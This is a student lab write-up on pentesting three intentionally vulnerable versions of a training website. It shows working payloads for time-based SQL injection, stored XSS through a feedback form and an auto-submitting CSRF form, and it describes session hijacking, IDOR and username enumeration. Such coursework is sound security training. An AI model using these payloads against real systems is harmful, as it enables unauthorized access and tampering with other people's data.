# Project 8 - Pentesting Live Targets

Time spent: **6** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

Vulnerability #1: Session Hijacking

![](https://raw.githubusercontent.com/ted0697/Week-8-Project-Pentesting-Live-Targets/master/blue-session.gif)
* By logging in and changing the PHPSESSIONID value to a logged in user, one can bypass the login

Vulnerability #2: SQL Injection

![](https://github.com/ted0697/Week-8-Project-Pentesting-Live-Targets/blob/master/blue-sql.gif?raw=true)
* Using the SQL query below, we can confirm SQL injection works since the sleep function is called:
* The loading icon will show up on the tab of the browser
```
%27%20OR%20SLEEP(5)=0--%27
```

## Green

Vulnerability #1: XSS

![](https://github.com/ted0697/Week-8-Project-Pentesting-Live-Targets/blob/master/green-xss.gif?raw=true)
* Submit a feedback via the contact page and wait for an admin to login to view feedback.
* Use the script below
```
<script>alert('hello xss')</script>
```
* Upon viewing the page on an admin account, the script will run showing the XSS exploit.

Vulnerability #2: User Enumeration

![](https://github.com/ted0697/Week-8-Project-Pentesting-Live-Targets/blob/master/green-user.gif?raw=true)
* The system bolds the text "Log in was unsuccessful" if the username submitted exists
* Otherwise if the username submitted does not exists, then the text "Log in was unsuccessful" does not become bold.


## Red

Vulnerability #1: IDOR

![](https://github.com/ted0697/Week-8-Project-Pentesting-Live-Targets/blob/master/red-idor.gif?raw=true)
* Go to the tab "Find a Salesperson" and view the infor of any salesperson.
* Since each salesperson is referenced by id=?, we can enumerate different id's to see if we can access userid's that were not made public.

Vulnerability #2: CSRF

![](https://github.com/ted0697/Week-8-Project-Pentesting-Live-Targets/blob/master/red-csrf.gif?raw=true)
* Create a HTML page that can send POST and have it POST to edit a specific salesperson
* I used the HTML below to create my POST
```
<html>
  <head>
    <title>CSRF</title>
  </head>
  <body onload="document.CSRF.submit()">
  <form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=12" method="post" style="display: none;" name='CSRF' target="res">
      <input type="text" name="first_name" value="CSRF" />
        <input type="text" name="last_name" value="EXPLOIT" />
        <input type="text" name="phone" value="1337-1337" />
        <input type="text" name="email" value="CSRF@EXPLOIT.com" />
  </form>
    <iframe name="res" style="display: none;"></iframe>
  </body>
</html>
```
* View the html file/page via an admin and the POST will automatically make changes.
* View the salesperson list to see what has changed




## Notes

Describe any challenges encountered while doing the work
